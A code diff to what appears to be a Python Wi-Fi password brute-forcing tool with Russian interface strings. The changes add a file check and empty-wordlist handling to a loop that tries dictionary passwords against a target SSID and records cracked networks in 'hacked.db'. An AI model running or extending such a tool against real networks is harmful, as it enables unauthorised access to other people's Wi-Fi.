@@ -1,7 +1,7 @@
-import sqlite3
+import sqlite3, os
 from pywifi import Profile, const
 from libs.TFormat import tcolors
-from libs.func import clear
+from libs.func import clear, checkfiles
 from time import sleep
 from tqdm import trange
 
@@ -24,6 +24,7 @@ def victim (iface, ssid, password): # Сетевой профиль
     else: return False
 
 def brutforce(iface, ssid):
+    if checkfiles() == 0: return 0
     connection = sqlite3.connect('files\\hacked.db')
     cursor = connection.cursor()
 
@@ -50,12 +51,17 @@ def brutforce(iface, ssid):
     # ----------------------------------------------
     
     clear()
-    print(tcolors.PROC)
-    passwords = open('files\\words.txt', 'r')
+    if os.stat("files\\words.txt").st_size != 0:
+        passwords = open('files\\words.txt', 'r')
+    else:
+        print(tcolors.ERROR + "[-] Словарь паролей (files\words.txt) пуст" + tcolors.END)
+        sleep(5)
+        return 0
+        
     l = len(passwords.readlines())
     passwords.seek(0)
     count = 0
-
+    print(tcolors.PROC)
     with trange(l, dynamic_ncols=True, desc=(f"[~] Попытка взлома {ssid}..."),\
                 bar_format=(tcolors.PROC + '{l_bar}{bar}{r_bar}'), unit='pwd') as bar:
         for pwd in passwords:
